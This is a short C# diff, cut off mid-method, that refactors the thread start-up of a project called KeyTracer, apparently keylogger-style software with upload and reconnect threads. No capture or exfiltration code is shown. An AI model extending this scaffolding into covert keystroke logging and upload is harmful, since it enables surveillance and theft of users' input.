@@ -3,41 +3,42 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.IO;
-using System.Net;
 using System.Threading;
+using System.Diagnostics;
 
 namespace KeyTracer
 {
-    static class Debug
+    public static class KeyTracerAPI
     {
-        public static int StartDebugging()
+        public static int Start()
         {
             try
             {
-                string server = "http://localhost:80/";
-
-                Consts.Server = server;
-                Consts.isConnected = true;
-
                 StartUp.Configure();
 
                 Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
                 uploadWork.Start();
 
+                Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
+                reConnect.Start();
+
                 Thread work = new Thread(new ThreadStart(Threads.DoWork));
                 work.Start();
 
-                while (true)
-                {
-                    Thread.Sleep(Consts.matchDelayTime);
+                return 1;
+            }
+            catch
+            {
+                return 0;
+            }
+        }
 
-                    if (!Consts.doWork)
-                    {
-                        Threads.AbortThreads(work, uploadWork);
-                    }
-                }
-               
+        public static int Stop()
+        {
+            try
+            {
+                Consts.doWork = false;
+
                 return 1;
             }
             catch
